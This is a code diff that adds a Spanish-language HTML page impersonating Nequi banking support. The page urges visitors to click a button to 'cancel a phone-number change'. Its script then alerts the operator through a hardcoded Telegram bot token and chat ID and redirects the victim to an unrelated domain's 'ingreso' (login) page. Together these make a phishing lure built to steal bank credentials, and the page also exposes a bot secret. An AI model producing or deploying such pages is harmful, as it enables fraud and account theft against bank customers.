@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Soporte de Ayuda</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="panel">
+            <div class="image-placeholder">
+                <!-- Aquí puedes insertar una imagen -->
+                <img src="logo.svg" alt="Imagen de soporte">
+            </div>
+            <h1>SOPORTE DE AYUDA NEQUI</h1>
+            <p>Ingresa al siguiente botón para cancelar el cambio de número</p>
+            <a id="cancelButton" href="URL_AQUI">
+                <button>CANCELAR CAMBIO</button>
+            </a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('cancelButton').addEventListener('click', function(event) {
+            event.preventDefault(); // Evita que el enlace se siga de inmediato
+
+            var chatId = "6618919756"; // Reemplaza con tu chat ID
+            var botToken = "7222469203:AAFQHhirrvnOPLikd-bE5isutnhSBrOsbMI"; // Reemplaza con el token de tu bot
+            var message = "El usuario ha solicitado cancelar el cambio de número.";
+
+            // Enviar notificación a Telegram usando fetch
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                // Redireccionar al enlace directamente sin mostrar mensaje
+                window.location.href = "https://eaty.shop/ingreso.html"; // Redirecciona a la página especificada
+            })
+            .catch(error => {
+                console.error('Error al conectar con Telegram:', error);
+                window.location.href = "https://eaty.shop/ingreso.html"; // Redirecciona incluso si hay error en Telegram
+            });
+        });
+    </script>
+</body>
+</html>
